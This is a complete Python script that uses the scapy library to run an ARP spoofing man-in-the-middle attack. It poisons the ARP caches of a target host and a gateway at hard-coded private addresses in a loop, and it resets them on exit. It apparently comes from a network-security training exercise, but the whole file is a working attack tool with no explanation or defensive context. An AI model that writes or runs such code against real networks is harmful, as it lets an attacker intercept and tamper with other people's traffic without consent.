#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combined = broadcast/request
    ans_list = scapy.srp(combined, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def send_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)

    scapy.send(packet, count=4, verbose=False)

target_ip = '10.0.2.7'
gateway_ip = '10.0.2.1'

packets_sent = 0
try:
    while True:
        send_spoof(target_ip, gateway_ip)
        send_spoof(gateway_ip, target_ip)
        packets_sent += 2
        print('\rpackets sent = ' + str(packets_sent)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print ('\r ending spoof... resetting ARP tables       ')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)